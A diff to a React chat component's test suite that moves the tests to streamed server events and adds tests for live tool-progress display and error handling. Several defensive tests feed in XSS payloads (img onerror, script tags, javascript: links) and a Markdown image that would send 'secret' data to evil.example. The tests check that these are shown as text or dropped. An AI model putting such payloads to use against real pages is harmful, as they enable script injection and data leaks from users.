@@ -34,6 +34,13 @@ function reply(overrides: Partial<ChatResponse> = {}): ChatResponse {
   };
 }
 
+/** A streamed answer, with any progress events the server would send first. */
+function streamed(answer: ChatResponse, progress: [string, unknown][] = []) {
+  const events: [string, unknown][] = [...progress, ["done", answer]];
+  const text = events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join("");
+  return new Response(text, { headers: { "Content-Type": "text/event-stream" } });
+}
+
 function json(body: unknown, status = 200) {
   return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
 }
@@ -59,7 +66,7 @@ function stubServer(chatResponses: (Response | Promise<Response>)[] = [], health
 
 function chatBodies(fetchMock: ReturnType<typeof stubServer>) {
   return fetchMock.mock.calls
-    .filter(([path, init]) => path === "/api/chat" && init?.method === "POST")
+    .filter(([path, init]) => path === "/api/chat/stream" && init?.method === "POST")
     .map(([, init]) => JSON.parse(init?.body as string) as Record<string, unknown>);
 }
 
@@ -80,7 +87,7 @@ describe("Chat", () => {
   });
 
   it("shows the question and answer, with its measurements", async () => {
-    stubServer([json(reply())]);
+    stubServer([streamed(reply())]);
     render(<Chat />);
     await ask(user);
 
@@ -91,7 +98,7 @@ describe("Chat", () => {
   });
 
   it("continues the same conversation on follow-up questions", async () => {
-    const fetchMock = stubServer([json(reply()), json(reply({ answer: "Second." }))]);
+    const fetchMock = stubServer([streamed(reply()), streamed(reply({ answer: "Second." }))]);
     render(<Chat />);
     await ask(user, "first");
     await screen.findByText("Here's what I found.");
@@ -105,7 +112,7 @@ describe("Chat", () => {
   });
 
   it("sends on Enter and adds a new line on Shift+Enter", async () => {
-    const fetchMock = stubServer([json(reply())]);
+    const fetchMock = stubServer([streamed(reply())]);
     render(<Chat />);
     const input = screen.getByLabelText("Your message");
     await user.type(input, "line one{Shift>}{Enter}{/Shift}line two");
@@ -132,19 +139,129 @@ describe("Chat", () => {
     render(<Chat />);
     await ask(user, "first");
 
-    expect(screen.getByRole("status")).toHaveTextContent("Working on it");
+    expect(screen.getByRole("status")).toHaveTextContent("Thinking");
     await user.type(screen.getByLabelText("Your message"), "too soon{Enter}");
     expect(chatBodies(fetchMock)).toHaveLength(1);
     expect(screen.getByLabelText("Engine")).toBeDisabled();
 
-    finish(json(reply()));
+    finish(streamed(reply()));
     await screen.findByText("Here's what I found.");
     expect(screen.queryByRole("status")).not.toBeInTheDocument();
   });
 
+  describe("live progress", () => {
+    /** A response whose events are released one at a time by the test. */
+    function controlledStream() {
+      const encoder = new TextEncoder();
+      let controller!: ReadableStreamDefaultController<Uint8Array>;
+      const body = new ReadableStream<Uint8Array>({
+        start(c) {
+          controller = c;
+        },
+      });
+      return {
+        response: new Response(body, { headers: { "Content-Type": "text/event-stream" } }),
+        send(name: string, data: unknown) {
+          controller.enqueue(encoder.encode(`event: ${name}\ndata: ${JSON.stringify(data)}\n\n`));
+        },
+        close() {
+          controller.close();
+        },
+      };
+    }
+
+    const search = { id: "t1", tool: "search_events", input: { keyword: "jazz", city: "Austin" } };
+    const details = { id: "t2", tool: "get_event_details", input: { event_id: "x" } };
+
+    it("shows each tool as it runs, finishes, or fails, then the answer", async () => {
+      const server = controlledStream();
+      stubServer([server.response]);
+      render(<Chat />);
+      await ask(user);
+      expect(screen.getByRole("status")).toHaveTextContent("Thinking");
+
+      server.send("model_call", { step: 1 });
+      server.send("tool_start", search);
+      server.send("tool_start", details);
+      expect(await screen.findByText("Searching for jazz in Austin…")).toBeInTheDocument();
+      expect(await screen.findByText("Looking up event details…")).toBeInTheDocument();
+      expect(screen.queryByText("Thinking…")).not.toBeInTheDocument();
+
+      server.send("tool_result", { ...search, is_error: false });
+      expect(await screen.findByText("Searched for jazz in Austin")).toBeInTheDocument();
+      expect(screen.getByText("Looking up event details…")).toBeInTheDocument();
+
+      server.send("tool_result", { ...details, is_error: true });
+      expect(await screen.findByText("Looked up event details (failed)")).toBeInTheDocument();
+
+      server.send("model_call", { step: 2 });
+      expect(await screen.findByText("Thinking…")).toBeInTheDocument();
+
+      server.send("done", reply({ steps: 2 }));
+      server.close();
+      expect(await screen.findByText("Here's what I found.")).toBeInTheDocument();
+      expect(screen.queryByRole("status")).not.toBeInTheDocument();
+    });
+
+    it("starts the next question with a clean list", async () => {
+      stubServer([
+        streamed(reply(), [
+          ["tool_start", search],
+          ["tool_result", { ...search, is_error: false }],
+        ]),
+        new Promise<Response>(() => {}),
+      ]);
+      render(<Chat />);
+      await ask(user, "first");
+      await screen.findByText("Here's what I found.");
+      await ask(user, "second");
+
+      expect(screen.getByRole("status")).not.toHaveTextContent("Searched");
+    });
+
+    it("clears the progress when an error event arrives", async () => {
+      const server = controlledStream();
+      stubServer([server.response]);
+      render(<Chat />);
+      await ask(user, "my question");
+
+      server.send("tool_start", search);
+      await screen.findByText("Searching for jazz in Austin…");
+      server.send("error", { status: 429, detail: "Rate limited by the API." });
+      server.close();
+
+      expect(await screen.findByRole("alert")).toHaveTextContent("Rate limited by the API.");
+      expect(screen.queryByRole("status")).not.toBeInTheDocument();
+      expect(screen.getByLabelText("Your message")).toHaveValue("my question");
+    });
+
+    it("explains when the connection drops partway through", async () => {
+      const server = controlledStream();
+      stubServer([server.response]);
+      render(<Chat />);
+      await ask(user);
+
+      server.send("model_call", { step: 1 });
+      server.close();
+
+      expect(await screen.findByRole("alert")).toHaveTextContent("connection to the server was lost");
+    });
+
+    it("shows tool input as plain text", async () => {
+      const server = controlledStream();
+      stubServer([server.response]);
+      const { container } = render(<Chat />);
+      await ask(user);
+
+      server.send("tool_start", { id: "t1", tool: "search_events", input: { keyword: "<img src=x onerror=alert(1)>" } });
+      expect(await screen.findByText(/Searching for <img/)).toBeInTheDocument();
+      expect(container.querySelector("img")).toBeNull();
+    });
+  });
+
   it("lists the tool calls it made, marking failures", async () => {
     stubServer([
-      json(
+      streamed(
         reply({
           steps: 3,
           tool_calls: [
@@ -167,7 +284,7 @@ describe("Chat", () => {
     ["refusal", "declined"],
     ["step_limit", "step limit"],
   ])("says when a reply stopped with %s", async (stop_reason, expected) => {
-    stubServer([json(reply({ stop_reason }))]);
+    stubServer([streamed(reply({ stop_reason }))]);
     render(<Chat />);
     await ask(user);
     expect(await screen.findByText(new RegExp(expected))).toBeInTheDocument();
@@ -176,9 +293,9 @@ describe("Chat", () => {
   describe("when a question fails", () => {
     it("explains why, restores the text, and starts a new conversation next", async () => {
       const fetchMock = stubServer([
-        json(reply()),
+        streamed(reply()),
         json({ detail: "Rate limited by the API." }, 429),
-        json(reply({ session_id: "session-2", answer: "Back again." })),
+        streamed(reply({ session_id: "session-2", answer: "Back again." })),
       ]);
       render(<Chat />);
       await ask(user, "first");
@@ -197,7 +314,7 @@ describe("Chat", () => {
 
   describe("starting over", () => {
     it("New chat clears the screen and ends the conversation on the server", async () => {
-      const fetchMock = stubServer([json(reply())]);
+      const fetchMock = stubServer([streamed(reply())]);
       render(<Chat />);
       await ask(user);
       await screen.findByText("Here's what I found.");
@@ -208,7 +325,7 @@ describe("Chat", () => {
     });
 
     it("changing the engine starts a new chat on that engine", async () => {
-      const fetchMock = stubServer([json(reply()), json(reply({ session_id: "session-2", engine: "langgraph" }))]);
+      const fetchMock = stubServer([streamed(reply()), streamed(reply({ session_id: "session-2", engine: "langgraph" }))]);
       render(<Chat />);
       await ask(user, "first");
       await screen.findByText("Here's what I found.");
@@ -223,7 +340,7 @@ describe("Chat", () => {
     });
 
     it("doesn't show an error if ending the old conversation fails", async () => {
-      const fetchMock = stubServer([json(reply())]);
+      const fetchMock = stubServer([streamed(reply())]);
       render(<Chat />);
       await ask(user);
       await screen.findByText("Here's what I found.");
@@ -272,7 +389,7 @@ describe("Chat", () => {
     }
 
     it("keeps the conversation and the unsent text", async () => {
-      const fetchMock = stubServer([json(reply()), json(reply({ answer: "Second." }))]);
+      const fetchMock = stubServer([streamed(reply()), streamed(reply({ answer: "Second." }))]);
       const { rerender } = renderInDom(<App showChat />);
       await ask(user, "first");
       await screen.findByText("Here's what I found.");
@@ -297,7 +414,7 @@ describe("Chat", () => {
       await ask(user);
 
       rerender(<App showChat={false} />);
-      finish(json(reply()));
+      finish(streamed(reply()));
       await new Promise((resolve) => setTimeout(resolve, 0));
       rerender(<App showChat />);
 
@@ -316,7 +433,7 @@ describe("Chat", () => {
   });
 
   it("shows Markdown tables as tables", async () => {
-    stubServer([json(reply({ answer: "| Show | Price |\n|---|---|\n| Velvet Static | $45 |" }))]);
+    stubServer([streamed(reply({ answer: "| Show | Price |\n|---|---|\n| Velvet Static | $45 |" }))]);
     render(<Chat />);
     await ask(user);
 
@@ -327,7 +444,7 @@ describe("Chat", () => {
   describe("answers are untrusted", () => {
     it("shows HTML as text instead of running it", async () => {
       const { container } = render(<Chat />);
-      stubServer([json(reply({ answer: 'Show: <img src="https://evil.example/x" onerror="alert(1)"><script>alert(1)</script>' }))]);
+      stubServer([streamed(reply({ answer: 'Show: <img src="https://evil.example/x" onerror="alert(1)"><script>alert(1)</script>' }))]);
       await ask(user);
       await screen.findByText(/Show:/);
 
@@ -337,7 +454,7 @@ describe("Chat", () => {
 
     it("removes Markdown images, which would send a request to any address", async () => {
       const { container } = render(<Chat />);
-      stubServer([json(reply({ answer: "Before ![secret](https://evil.example/?data=secret) after" }))]);
+      stubServer([streamed(reply({ answer: "Before ![secret](https://evil.example/?data=secret) after" }))]);
       await ask(user);
       await screen.findByText(/Before/);
 
@@ -346,7 +463,7 @@ describe("Chat", () => {
     });
 
     it("opens links safely, and drops dangerous ones", async () => {
-      stubServer([json(reply({ answer: "[Tickets](https://example.com/t) and [bad](javascript:alert(1))" }))]);
+      stubServer([streamed(reply({ answer: "[Tickets](https://example.com/t) and [bad](javascript:alert(1))" }))]);
       render(<Chat />);
       await ask(user);
 
